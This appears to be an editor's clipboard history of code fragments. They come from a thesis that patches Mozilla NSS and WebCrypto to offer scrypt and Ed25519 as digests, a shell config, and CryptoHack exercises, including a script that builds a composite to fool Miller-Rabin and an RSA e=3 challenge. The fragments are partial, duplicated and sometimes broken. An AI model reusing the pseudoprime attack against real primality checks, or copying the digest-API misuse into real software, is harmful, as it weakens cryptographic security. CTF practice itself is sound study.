	if (algName.EqualsLiteral(WEBCRYPTO_ALG_SHA1) ||
	    algName.EqualsLiteral(WEBCRYPTO_ALG_SHA256) ||
	    algName.EqualsLiteral(WEBCRYPTO_ALG_SHA384) ||
	    algName.EqualsLiteral(WEBCRYPTO_ALG_SCRYPT) ||
	    ...
	    return new DigestTask(aCx, aAlgorithm, aData);
c425ba5d8dbe8c277e0f2ee918ca9f77|file:///home/neo/Documents/thesis/appendices.tex|97|1|V|tex
	return new FailureTask(NS_ERROR_DOM_NOT_SUPPORTED_ERR);
cd2eec0489446f55c189db4231338f37|file:///media/neo/Storage/mozilla-central/security/nss/lib/util/secoidt.h|34|1|V|cpp
	typedef enum {
	    SEC_OID_UNKNOWN = 0,
	    SEC_OID_MD2 = 1,
	    SEC_OID_MD4 = 2,
	    SEC_OID_MD5 = 3,
	    SEC_OID_SHA1 = 4,
ac91bef2212cae60914da23cab14fe3e|file:///media/neo/Storage/mozilla-central/security/nss/lib/util/secoidt.h|505|1|V|cpp
	    SEC_OID_SCRYPT = 364,
d0ae3810e575e58534f7d215c0f5644c|file:///media/neo/Storage/mozilla-central/security/nss/lib/util/utilmodt.h|26|1|V|cpp
	#define SECMOD_SHA256_FLAG 0x00004000L   /* also for SHA224 */
	#define SECMOD_SHA512_FLAG 0x00008000L   /* also for SHA384 */
	#define SECMOD_CAMELLIA_FLAG 0x00010000L /* = PUBLIC_MECH_CAMELLIA_FLAG */
	#define SECMOD_SEED_FLAG 0x00020000L
	#define SECMOD_ECC_FLAG 0x00040000L
	#define SECMOD_SCRYPT_FLAG 0x00080000L 
abd7b762bdd2653fff9ed714aff7233b|file:///home/neo/Documents/thesis/appendices.tex|112|1|V|tex
	#define SECMOD_CAMELLIA_FLAG 0x00010000L /* = PUBLIC_MECH_CAMELLIA_FLAG */
ef1e96891e5b93baa85eb98ec5ceda0f|file:///home/neo/Documents/thesis/appendices.tex|112|1|V|tex
	#define SECMOD_SEED_FLAG 0x00020000L
90a8125574df19d70576d6df69b1c09f|file:///home/neo/Documents/thesis/appendices.tex|112|1|V|tex
	#define SECMOD_ECC_FLAG 0x00040000L
73546c99716b48ce126dd2a824795206|file:///media/neo/Storage/mozilla-central/security/nss/lib/util/secdig.c|31|1|V|c
	SGNDigestInfo *
	SGN_CreateDigestInfo(SECOidTag algorithm, const unsigned char *sig,
	                     unsigned len)
	{
	    SGNDigestInfo *di;
	    SECStatus rv;
	    PLArenaPool *arena;
	    SECItem *null_param;
	    SECItem dummy_value;
	
	    switch (algorithm) {
	        case SEC_OID_MD2:
	        case SEC_OID_MD5:
	        case SEC_OID_SHA1:
	        case SEC_OID_SHA224:
	        case SEC_OID_SHA256:
	        case SEC_OID_SHA384:
	        case SEC_OID_SHA512:
	        case SEC_OID_SCRYPT:
	        case SEC_OID_CURVE25519:
	        case SEC_OID_ED25519SIGN:
	            break;
e0d829a93d4aa5e018e7d67b6b7fcbbd|file:///home/neo/Documents/thesis/appendices.tex|122|1|V|tex
	    SGNDigestInfo *di;
	    SECStatus rv;
	    PLArenaPool *arena;
	    SECItem *null_param;
	    SECItem dummy_value;
9cb4cc3bc43908ae8ec5ca2fb2b622a2|file:///home/neo/Documents/thesis/appendices.tex|132|3|V|tex
	        case SEC_OID_CURVE25519:
	        case SEC_OID_ED25519SIGN:
c21e850433c9430a715cb0ed19096133|file:///home/neo/Documents/thesis/appendices.tex|123|13|V|tex
	    switch (algorithm) {
	        case SEC_OID_MD2:
	        case SEC_OID_MD5:
	        case SEC_OID_SHA1:
e282713cc790ebbd09a1375117dfae80|file:///home/neo/Documents/thesis/appendices.tex|124|13|V|tex
	        case SEC_OID_MD2:
	        case SEC_OID_MD5:
	        case SEC_OID_SHA1:
	        case SEC_OID_SHA224:
2472f58e942d18ba9fc92fc02a3e0203|file:///home/neo/cryptohack/general/mathematics2/13385.py|16|1|V|python
	def miller_rabin(n, b):
	    """
	    Miller Rabin test testing over all
	    prime basis < b
	    """
	    basis = generate_basis(b)
	    if n == 2 or n == 3:
	        return True
	
	    if n % 2 == 0:
	        return False
	
	    r, s = 0, n - 1
	    while s % 2 == 0:
	        r += 1
	        s //= 2
	    for b in basis:
	        x = pow(b, s, n)
	        if x == 1 or x == n - 1:
	            continue
	        for _ in range(r - 1):
	            x = pow(x, 2, n)
	            if x == n - 1:
	                break
	        else:
	            return False
	    return True
	
ba18944cdaaceac16277e67e893eab57|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|88|1|V|python
	    print(p1 % mod)
37b3e85a2a346312bf1490318bd5b353|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|41|1|V|python
	for i in range(20):
baf905d0953aa5cabbffe25e79b0578a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|66|1|V|python
	            found = False
	            while not found:
524d6212a2d8587c311389db5ad17409|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|70|1|V|python
	                try:
c93ff51422230cc59cc1a5ceb154b810|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|75|1|V|python
	                except:
	                    Sk[i] = P.next(Sk[i])
03c741aaabf7bdfa65b659cfe0383a48|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|69|1|V|python
	                print(f"Sk[{i}]: {k}")
fd2322fa6d13a69299a4581114c21df3|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|72|1|V|python
	                k = Sk[i]
e2d57a2b700dc0e198c1880ee5a1871a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|53|5|V|python
	for Sa in Sb:
	    print(Sa)
0e0ab507e5c0becdcb84fcbcae11d71d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|78|13|V|python
	                    print(f"Sk[{i}]: {k}")
dd2472927313a8eb8ef145b50615ff98|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|82|9|V|python
	        print(f"Sk[{i}]: {k}")
ab16ea3b400a5f9f818b2f6e9150cf39|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|88|1|V|python
	for i,Sa in enumerate(new_Sb_:
	        print(i+1, ": ",sorted(set(Sa)))
4df6fa83f07d24c6d09f8eee80621f31|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|88|1|V|python
	for Sa in new_Sb:
	    print(sorted(set(Sa)))
6308fa5d3e52d81ace0f86382bf9157d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|94|19|v|python
	Sa.remove(0)
b25c831298fc9bce1552a247f61f5e67|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|95|1|V|python
	print(choice)
14aff45c80401e9efc7a750eb50dc70e|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|106|1|V|python
	print(len(Sa))
ceaf58853493e5714e5e7181899dea10|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|104|1|V|python
	print(len(choice))
dd89b155e305f5dc630069e3a1d160f8|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|103|13|V|python
	print(choice)
	print(Sa)
9d99cb66a73a06f8a32c7706fde6bc56|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|105|1|V|python
	print(mod)
2aa953c1884d8f9bfb69cf56184f77a1|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|95|19|V|python
	# for Sa in new_Sb:
	    # choice.append(list(Sa)[0])
64cf3cd460824880a3f241897eb20a61|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|99|15|v|python
	inverse_mod((Sk[1]-1)*Sk[2], Sk[1])
498256481e4267eb1693913c8f186a0f|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|101|15|v|python
	inverse_mod((Sk[2]-1)*Sk[1], Sk[2])
e4fc989860f7883c4299d8a89db6a59a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|102|1|V|python
	Sa = [4*a for a in bases]
a04a46b00141cb825afaa663e69411a9|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|106|5|V|python
	for i in range(1,len(Sk)):
	    Sa.append(Sk[i])
b9906de9c23d312f4fd2de41765586c4|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|110|5|V|python
	    found = False
5d4ca3c16c28a3576312cb11973542b5|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|114|5|V|python
	    print(f"Requirement: p1 = {p1} mod {mod}")
6f8284f712305628a10b14dca5c4147c|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|106|1|V|python
	choice = []
7e3b36c836dd05018f3244d162b4e9af|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|110|5|V|python
	    print(choice)
bd1223e8f356dd8e0f5fe44ad943e77f|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|106|1|V|python
	for choice in choices:
09c366626d44904f507c49a9d65fbfb1|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|106|5|V|python
	    print(choice)
	
	found = False
6361700f31cb9a15bb456ae7acdfa36a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|104|12|v|python
	list(choice) for choice in itertools.product(*new_Sb)
822ba326f7a6aa1b479879b253c86862|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|103|1|V|python
	new_Sb = [[5], [7], [3,13]]
3057c2503b51a18bf5240aa6dc1ff370|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|103|1|V|python
	choices = []
f28e9fe634a5e2c596b0f598c63a46b6|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|114|9|V|python
	        print('error')
4c825ee314c1d4e90579beceb668a8d4|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|115|17|V|python
	        mod = lcm(Sa)
	        print(mod)
da4557275b53207fc0f3ab6acc2bb131|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|116|9|V|python
	        print(mod)
6ee888ca99afe374906d8bb117822c5d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|94|1|V|python
	# choice = [3,7,3,15,23,47,31,47,47,55]
8dc837c82d16d00004a9e8431b4b3a44|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|108|5|V|python
	    choice = [3,7,3,15,23,47,31,47,47,55]
39688deb3eed93ec95c0bac7d16301b8|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|118|13|V|python
	            print(mod)
3d28dd6c7dffbd72f78294b99dcfcf01|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|117|13|V|python
	            mod = lcm(Sa)
b2d62c88a44f34e20441fc036b424e1c|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|106|1|V|python
	mod = 0
79c42d63a73014ae7ad7b8bc1a8f543d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|116|13|V|python
	            print(Sa)
9b9c5a78ff39ddcd2b225977de888ac0|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|115|13|V|python
	            print(choice)
	            print(Sa)
52b15563f2522dde9e4b21543486a1ce|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|121|44|V|python
	        if choice[0] == 3 and choice[2] == 3:
	            print(choice)
4a9d200cbb1bf622a646ad9a4e4cc568|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|108|5|V|python
	    if choice == [3,7,3,15,23,47,31,47,47,55]:
	        print(choice)
105462299c3b2c785fb060723d978227|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|109|8|v|python
	choice == [3,7,3,15,23,47,31,47,47,55]
fba8440dcc9e650ac0f75ceb0f1d5fd8|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|107|1|V|python
	for choice in itertools.product(*new_Sb):
	    choice = list(choice)
	    if choice == [3,7,3,15,23,47,31,47,47,55]:
	        print(choice)
d371915f895f4d1bade40213f0582099|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|107|1|V|python
	for choice in itertools.product(*new_Sb):
	    choice = list(choice)
	    if choice == [3,7,3,15,23,47,31,47,47,55]:
	        print(choice)
	    choice = [3,7,3,15,23,47,31,47,47,55]
3ba1319b3b343ebc2a46faa88a256e2b|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|110|9|V|python
	        choice = [3,7,3,15,23,47,31,47,47,55]
ba07513582bf5f9092604c36f90ee5dd|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|109|1|V|python
	    assert type(choice) == list
fd14d700397b43f9405f932b5251110d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|111|18|v|python
	[3,7,3,15,23,47,31,47,47,55]
19ddbc70826f187da9921cfd434bfa66|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|110|5|V|python
	    choice = choice[::]
9e6a43ba423b50dd703bc4842b907d1a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|122|1|V|python
	print("Residues: ", choice)
	print(f"Requirement: p1 = {p1} mod {mod}")
28f04e5711b1f7daed9b6cd54310afde|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|136|5|V|python
	    p1 += mod * 10^40
79143def38ed036b321f32242064c052|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|126|1|V|python
	    if is_prime(p1):
	        p1 += mod * 10^45
	        p2 = Sk[1] * (p1 - 1) + 1
	        p3 = Sk[2] * (p1 - 1) + 1
	        if is_prime(p2) and is_prime(p3):
	            n = p1 * p2 * p3
	            bit_length = n.nbits()
	            if bit_length > 600:
	                print(n)
	                if miller_rabin(n, 64):
	                    break
77628a64d76f1b6a99c41cbb95f90d0e|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|137|1|V|python
	while True:
3eb99e72517406ae655c1070a0d542a2|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|130|33|V|python
	                                break
6dd411570648cf51e865c1a7abe4285d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|136|1|V|python
	# p1 = 142445387161415482404826365418175962266689133006163
4da9370cf510f6f043cefa6d733a6a8c|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|129|1|V|python
	                            print(n)
0d35b19ad01d516ee03e43960c112543|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|115|13|V|python
	            print(p1)
4655fc680080a6a2e1fcb8610a97bc12|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|116|40|V|python
	                print("Residues: ", choice)
	                print(f"Requirement: p1 = {p1} mod {mod}")
c852b647de340480d91885a5e8520c88|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|117|17|V|python
	                if is_prime(p1):
c8a81ff7b67dc807eea8ebabe881f645|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|116|17|V|python
	                print(p1)
f3f390ae54a0e42eb7f3c004b8a6bd98|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|115|13|V|python
	            p1 = CRT_list(choice,Sa)
364bdab59c1729942b4cf972d72df44b|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|115|9|V|python
	            print(choice)
9adde934e76ffc0408918cec2d3a60c2|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|114|9|V|python
	        while not found:
8c20d452f952ee27bc97327a8ed23615|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|114|9|V|python
	        print(choice)
0c6c9da64ee51f13129d42e81103a07f|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|132|5|V|python
	    except:
	        continue
8ecc7ff130b8027c95235aa0ce060288|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|113|5|V|python
	        if choice == [3,7,3,15,23,47,31,47,47,55]:
	            print("CHOICE")
e93c8855f897a72a787011ce85f25ca3|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|112|9|V|python
	        print(is_prime(p1))
5e877775fafc7478d8f05b977fcc9530|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|110|1|V|python
	    if choice == [3,7,3,15,23,47,31,47,47,55]:
79cfd4bb84957d1a64fe73ec90468511|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|117|1|V|python
	        p1 = CRT_list(choice,Sa)
71397ffe8e1c20cc13af669ffe0df87c|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|119|9|V|python
	        if choice == [3,7,3,15,23,47,31,47,47,55]:
	            print(p1)
5b40e7ba5bd9c56c9fe38526a792bbbd|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|119|9|V|python
	        if choice == [3,7,3,15,23,47,31,47,47,55]:
957e06a924e2a9c8d2448e62be9d7c9b|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|119|13|V|python
	            print(p1)
	            print(is_prime(p1))
39bbb093bbe1a42eab8815ca2ed73280|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|117|1|V|python
	    choice.append(r1)
	    choice.append(r2)
bc1d3d79a7f34b02f27ccae6866044a2|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|124|12|v|python
	is_prime(p1):
7298987eb04dab9e00f90341cc1bc4f4|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|124|9|V|python
	        if 
a188ba6c2e78187cb01e5af28b01fad7|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|127|9|V|python
	        p1 += mod * 10^45
f249a77918a5bc1caabb30d4bfc3be82|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|125|13|V|python
	            p1 += mod
782f562eff73ccf5d943d6794d184eed|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|127|1|V|python
	        p2 = Sk[1] * (p1 - 1) + 1
	        p3 = Sk[2] * (p1 - 1) + 1
c8ede185bef6a08ad1539e8bba8b46f9|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|133|1|V|python
	            n = p1 * p2 * p3
ecececf105b9524cd4034ed2fd567606|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|124|13|V|python
	            p1 += mod * 10^40
3bb7087f693474e8e46feced10e70b9b|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|129|9|V|python
	        print("Residues: ", choice)
	        print(f"Requirement: p1 = {p1} mod {mod}")
9fd36e16a2c5e814f5a1e45910dd608b|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|127|9|V|python
	            p2 = Sk[1] * (p1 - 1) + 1
	            p3 = Sk[2] * (p1 - 1) + 1
	            n = p1 * p2 * p3
c4b024a4ce04abb503ae9f9dc4a9ce86|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|126|9|V|python
	        print(p1.nbits())
7c6ee3bb353cfba500cb06c5ac7307ca|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|128|9|V|python
	        print("P1:", p1)
3e01dc8f954728763b9877db5371a8a7|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|155|1|V|python
	p1 = 142445387161415482404826365418175962266689133006163
6e2c6ff08bfab1f9dcaa08d3ab6b617d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|128|9|V|python
	        p1 = 142445387161415482404826365418175962266689133006163
9f229a0975d8da8d2f669ca5a037c290|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|126|9|V|python
	        p1 += mod * 10^40
a7da3a25cfacc56280630d0f64441535|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|142|9|V|python
	                if miller_rabin(n, 64):
62a55a1f743be2be8fe3c7592d85193f|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|143|17|V|python
	                found = True
66a4e2c3b85e8f7081678834b1627e02|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|143|17|V|python
	                else:
	                    print("Didn't pass Miller Rabin")
af89f6e602a77f72ddf935511a21aafa|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|127|64|V|python
	        p1 = 142445387161415482404826365418175962266689133006163
	        print(p1.nbits())
0284340ff426931f9f65e5ee6fd8a66a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|112|1|V|python
	    # if choice == [3,7,3,15,23,47,31,47,47,55]:
	    #     choice.append(r1)
	    #     choice.append(r2)
	    #     print("CHOICE")
	    #     p1 = CRT_list(choice,Sa)
	    #     print(p1)
	    #     print(is_prime(p1))
2c76ef38d9f391862a38c35ae9a26d35|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|123|5|V|python
	        print(is_prime(p1))
	        print(is_prime(p2))
	        print(is_prime(p3))
668f35621499abeac1b5598f824c90be|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|136|1|V|python
	# print(p1)
	# print(p2)
	# print(p3)
	# print(n)
	
84c8add9bc1fa4076494133957eb863a|file:///home/neo/.zshrc|104|1|V|zsh
	# Hadoop settings
e43fad90c218790da7c7af744cbe0dcd|file:///home/neo/.zshrc|106|1|V|zsh
	#HADOOP ENVIRONMENT
	export HADOOP_HOME=/usr/local/hadoop
	export HADOOP_CONF_DIR=/usr/local/hadoop/etc/hadoop
	export HADOOP_MAPRED_HOME=/usr/local/hadoop
	export HADOOP_COMMON_HOME=/usr/local/hadoop
	export HADOOP_HDFS_HOME=/usr/local/hadoop
	export YARN_HOME=/usr/local/hadoop
	export PATH=$PATH:/usr/local/hadoop/bin
	export PATH=$PATH:/usr/local/hadoop/sbin
	#HADOOP NATIVE PATH:
	export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native
	export HADOOP_OPTS=‚Äú-Djava.library.path=$HADOOP_PREFIX/lib/native‚Äù
	export YARN_RESOURCEMANAGER_OPTS="--add-modules=ALL-SYSTEM"
	
91be254ebe02f9a13b731a50c43b3b02|file:///home/neo/.zshrc|108|1|V|zsh
	# Key bindings
	setxkbmap -option caps:swapescape
	setxkbmap -option ctrl:ralt_rctrl
6bdb3974a4f5ab757e035ae293ccdc74|file:///home/neo/.zshrc|116|1|V|zsh
	export PATH="$HOME/wabt/bin:$PATH"
423921aa8d3c99bc322e93f6e0a13af7|file:///home/neo/.zshrc|138|1|V|zsh
	# unset __conda_setup
	# conda deactivate
	# <<< conda initialize <<<
e40df61112f29ed55acce29df72176e5|file:///home/neo/.zshrc|126|1|V|zsh
	# >>> conda initialize >>>
	# !! Contents within this block are managed by 'conda init' !!
	__conda_setup="$('/media/neo/Storage/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	if [ $? -eq 0 ]; then
	    eval "$__conda_setup"
	else
	    if [ -f "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh" ]; then
	        . "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh"
	    else
	        export PATH="/media/neo/Storage/anaconda3/bin:$PATH"
	    fi
	fi
688336889b3d1de21c78cfe9686cc679|file:///home/neo/.zshrc|1|1|V|zsh
	# Luke's config for the Zoomer Shell
67e1f6c093e73c4746cf268650fefc3a|file:///home/neo/Documents/thesis/appendices.tex|78|14|v|tex
	Adding  to the supported hash functions of the WebCryptoAPI
4c7d8d28147aeab067df44ead4adf806|file:///media/neo/Storage/mozilla-central/dom/crypto/WebCryptoTask.cpp|3078|1|V|cpp
	                algName.EqualsLiteral(WEBCRYPTO_ALG_CURVE25519) ||
	                algName.EqualsLiteral(WEBCRYPTO_ALG_ED25519SIGN) ||
448ef12e47f39d0b101dd2beb7d41b98|file:///home/neo/Documents/thesis/appendices.tex|79|5|V|tex
	    \label{lst:support_scrypt}
e9741d3827a8ccfa4e58a730034a0bc2|file:///media/neo/Storage/mozilla-central/security/nss/lib/util/secoidt.h|508|1|V|cpp
	    SEC_OID_ED25519SIGN = 367,
84653e96f95b54cad6f66825d5f5129f|file:///media/neo/Storage/mozilla-central/security/nss/lib/util/utilmodt.h|33|1|V|cpp
	#define SECMOD_CURVE25519_FLAG 0x00200000L 
	#define SECMOD_ED25519SIGN_FLAG 0x00400000L 
e942ce8666db11ba9e6f135c7f1d22bb|file:///home/neo/Documents/thesis/implementation.tex|40|1|V|tex
	% \elathan{Replace footnote with a reference}
50fac9be180c5a60d9cf2fa6740a6589|file:///home/neo/Documents/thesis/implementation.tex|47|1|V|tex
	Specifically, we added the functionality to create an Ed25519 keypair as a hash function called 
45835389fb28ac42b86828db4e67abc4|file:///home/neo/Documents/thesis/implementation.tex|47|72|v|tex
	specifically
deab6445f675cfddf56075c53ad1c5d2|file:///home/neo/Documents/thesis/appendices.tex|56|1|V|tex
	\chapter{Signature verification} \label{app:appenixB}
df32f7a2995265ae8f0f72dcb16855ac|file:///home/neo/Documents/thesis/appendices.tex|56|1|V|tex
	\chapter{Signature verification} \label{app:appenixB}
	\begin{figure}[h]
	    \caption{Python script which checks the validity of the signature} 
	    \label{lst:verify_sig}
	\begin{lstlisting}[]
8c09001c99ecb6fdd8d6023fcf039054|file:///home/neo/Documents/thesis/appendices.tex|141|10|v|tex
	Signature
7aa10df2f6e89f09f2465c27f941c312|file:///home/neo/Documents/thesis/appendices.tex|141|10|v|tex
	 verification
1c4099628b75323a47bae4fb1ee7e5db|file:///home/neo/Documents/thesis/appendices.tex|144|5|V|tex
	    \label{lst:verify_sig}
79521051c5c4526354393a974d561458|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|31|46|v|javascript
	sha512
08a50fdce88ec387cac70fcd060f04ba|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|29|1|V|javascript
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of scrypt hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
a71fd23393c7d573e9ec679cc6cc62a1|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|45|1|V|javascript
	let signMessage = async function (keypair, message) {
	  const input = keypair.concat(message);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	};
cdfd32e901b177e75d4243fc6d885c3f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|38|1|V|javascript
	  const publicKey = publicKeyByteArray
	    .map((b) => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
	};
802372c8f2e5abe442d3c0afb388392b|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|13|1|V|python
	def pad100(msg):
	    return msg + b'\x00' * (100 - len(msg))
a240e369a61b39a02333cd2b8a96c1b9|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|3|1|V|python
	from Crypto.PublicKey import RSA
	from Crypto.Util.number import bytes_to_long, long_to_bytes
	from sympy.core.numbers import mod_inverse
d49f24d82c7a189ee3fa585f86cc2caa|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|7|8|v|python
	b"crypto{???????????????????????????????????}"
932f05d31e0e825a05448b2565c1298d|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|9|1|V|python
	n = 95341235345618011251857577682324351171197688101180707030749869409235726634345899397258784261937590128088284421816891826202978052640992678267974129629670862991769812330793126662251062120518795878693122854189330426777286315442926939843468730196970939951374889986320771714519309125434348512571864406646232154103
	e = 3
47670c63182b1f90e61e9c47250d6bbc|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/script.py|22|1|V|python
	def is_pkcs7_padded(message):
	    padding = message[-message[-1]:]
682bec67790a24d0ac68eaf70859ca5d|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/script.py|23|1|V|python
	    padding = message[-message[-1]:]
076fed4dd7213b2cd86238f76fdbdb5b|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/script.py|24|12|v|python
	all(padding[i] == len(padding) for i in range(0, len(padding)))
8aadac53b55b93f7ae09725e9540ba2f|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/script.py|65|1|V|python
	    p = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919
	    q = (p - 1) // 2
5c6f7298edda7be95adceb8eecf3b13f|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|4|1|V|text
	B: 652888676809466256406904653886313023288609075262748718135045355786028783611182379919130347165201199876762400523413029908630805888567578414109983228590188758171259420566830374793540891937904402387134765200478072915215871011267065310188328883039327167068295517693269989835771255162641401501080811953709743259493453369152994501213224841052509818015422338794357540968552645357127943400146625902468838113443484208599332251406190345653880206706388377388164982846343351
2df10bd64446a49578dc265c2d9a5eb1|file:///home/neo/cryptohack/general/mathematics2/ROCA2/ROCA.log|1|4|v|
